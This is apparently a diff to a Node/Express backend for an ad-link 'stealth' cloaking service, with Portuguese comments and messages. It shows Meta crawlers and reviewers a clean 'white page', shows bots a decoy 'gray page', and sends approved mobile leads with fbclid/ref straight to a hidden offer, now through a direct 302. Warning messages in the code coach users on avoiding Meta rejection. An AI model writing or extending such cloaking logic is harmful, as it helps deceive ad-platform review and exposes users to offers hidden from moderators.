@@ -1596,7 +1596,7 @@ app.get('/api/sites/:siteId/link-health', async (req, res) => {
       level: zeroRedirect ? 'info' : 'medium',
       message: zeroRedirect
         ? 'Stealth + Zero-Redirect: crawler vê white page; lead aprovado recebe oferta na mesma URL (sem 302). Alinhe white page, gray page e oferta ao criativo do anúncio.'
-        : 'Stealth com oferta externa: GET do link sempre devolve a white (200). Lead liberado vai à oferta via JS (sem 302 no primeiro hit). Zero-Redirect (oferta em Páginas) reduz ainda mais o risco Meta.'
+        : 'Stealth com oferta externa: lead liberado abre a oferta na hora (302). Crawler vê white (200). Zero-Redirect (oferta em Páginas) reduz risco Meta se houver rejeição por redirect.'
     });
   }
   if (redirectChain.length > 2) {
@@ -2447,21 +2447,29 @@ async function resolveStealthDelivery(site, ctx) {
   if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
     return { kind: 'offer', reason: 'allowed' };
   }
-  // Lead liberado → soft_redirect via /api/n/ (GET do link NUNCA dá 302 — evita padrão "link enganoso")
+  // Lead liberado → soft_redirect (GET responde 302 imediato — zero tela branca)
   return { kind: 'soft_redirect', url: ctx.destWithQs, reason: 'allowed' };
 }
 
 async function sendStealthDelivery(res, site, delivery, navOpts) {
-  // soft_redirect NÃO usa 302 — destino só via JSON do /api/n/ (ponte no cliente)
+  if (delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') {
+    const url = delivery.url;
+    if (url) {
+      res.setHeader('Cache-Control', 'no-store, no-cache, private');
+      res.setHeader('Pragma', 'no-cache');
+      return res.redirect(302, url);
+    }
+  }
   let inner = null;
-  if (delivery.kind === 'white' || delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') {
-    inner = await getStealthBridgeInnerHtml(site);
-  } else if (delivery.kind === 'gray') {
+  if (delivery.kind === 'white') inner = await getStealthBridgeInnerHtml(site);
+  else if (delivery.kind === 'gray') {
     inner = await getUserPageHtml(site.gray_page_id, site.user_id);
     if (!inner) inner = await getStealthBridgeInnerHtml(site);
   } else if (delivery.kind === 'offer') {
     inner = await getUserPageHtml(site.offer_page_id, site.user_id);
     if (!inner) inner = await getStealthBridgeInnerHtml(site);
+  } else {
+    inner = await getStealthBridgeInnerHtml(site);
   }
   const navScript = (navOpts && navOpts.includeNavScript) ? buildStealthNavScript(navOpts.prefix, navOpts.code) : '';
   sendStealthHtmlResponse(res, composeStealthHtml(wrapPageHtmlFragment(inner || ''), navScript));
@@ -2490,7 +2498,7 @@ function stealthDeliveryLabel(kind) {
     white: 'White page',
     gray: 'Gray page',
     offer: 'Página da oferta (Zero-Redirect)',
-    soft_redirect: '→ Oferta (ponte JS)',
+    soft_redirect: '→ Oferta (direto)',
     soft_redirect_ok: '→ Oferta CONFIRMADA ✓',
     redirect: '→ Oferta (legado)'
   };
@@ -3745,7 +3753,7 @@ function getMetaLinkConfigWarnings(site) {
     } else if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
       warnings.push({ level: 'info', code: 'stealth_zero_redirect', message: 'Zero-Redirect ativo: oferta entregue na mesma URL (página interna), sem salto para outro domínio.' });
     } else {
-      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Oferta externa: GET idêntico (white) para crawler e lead; lead liberado (fbclid/ref + mobile) segue via ponte JS. Alinhe o criativo à white page.' });
+      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Oferta externa: lead liberado (fbclid/ref + mobile) vai direto à oferta. Crawler Meta continua vendo só a white page. Alinhe o criativo à white.' });
     }
     if (!site.gray_page_id) {
       warnings.push({ level: 'low', code: 'no_gray_page', message: 'Sem Gray Page: visitantes bloqueados ficam na white page. Configure uma página cinza (isca) em Páginas para bots e revisores.' });
@@ -3893,16 +3901,23 @@ async function handleStealthNavigation(req, res) {
 async function handleStealthLinkGet(req, res, site) {
   const prefix = (req.params.prefix || '').toLowerCase().trim();
   const code = (req.params.code || '').toLowerCase();
-  // Loga a entrega INTENCIONADA (soft_redirect/white/gray/offer) — o HTML do GET é sempre a white.
   const ctx = await resolveLinkVisitContext(req, site, { skipRefCheck: false });
   if (ctx.visitorSql && ctx.visitorParams) {
     void db.run(ctx.visitorSql, ctx.visitorParams).catch((err) => console.error('[visitor] stealth get:', err.message));
   }
 
-  // GET idêntico para crawler, revisor e lead (200 + white). Sem 302.
-  // Lead liberado: script esconde o body, chama /api/n/, location.replace(oferta) sem flash.
-  // Crawler sem JS: lê só a white no HTML — não vê oferta nem funil.
-  return sendStealthBridgeResponse(res, site, prefix, code, { includeNavScript: true });
+  const delivery = await resolveStealthDelivery(site, ctx);
+
+  // Lead liberado (fbclid/ref + mobile): oferta IMEDIATA — sem tela branca / sem esperar /api/n/
+  if (delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') {
+    return sendStealthDelivery(res, site, { kind: 'soft_redirect', url: delivery.url || ctx.destWithQs });
+  }
+  if (delivery.kind === 'offer') {
+    return sendStealthDelivery(res, site, delivery, { includeNavScript: false });
+  }
+
+  // Crawler / revisor / bloqueado: só white ou gray (sem URL da oferta)
+  return sendStealthDelivery(res, site, delivery, { includeNavScript: false });
 }
 
 // Handler compartilhado para links (/:prefix/:code)
